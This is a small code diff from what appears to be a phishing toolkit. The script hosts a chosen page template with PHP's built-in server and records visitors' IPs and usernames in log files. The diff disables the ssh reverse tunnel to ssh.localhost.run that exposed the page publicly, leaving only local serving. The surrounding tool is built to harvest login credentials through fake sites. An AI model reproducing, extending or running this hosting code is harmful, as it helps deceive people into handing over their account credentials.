@@ -101,13 +101,13 @@ Please Choose A Number To Host Template:
     # subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
     # port = input('What port do you want it on? :')
     port = '8954'
-    name_server = input('What name do you want to give your server? :')
+    #name_server = input('What name do you want to give your server? :')
     #print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
     print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
-    command1 = f"php -t sites/{choice} -S 127.0.0.1:{port} &> /dev/null"
-    command2 = f"ssh -R 80:0.0.0.0:{port} {name_server}@ssh.localhost.run"
+    command1 = f"php -t sites/{choice} -S 127.0.0.1:{port}"
+    #command2 = f"ssh -R 80:0.0.0.0:{port} {name_server}@ssh.localhost.run"
     os.system(command1)
-    os.system(command2)
+    #os.system(command2)
     # p = subprocess.Popen(cmd_line, shell=True)
     # out = p.communicate()[0]
 
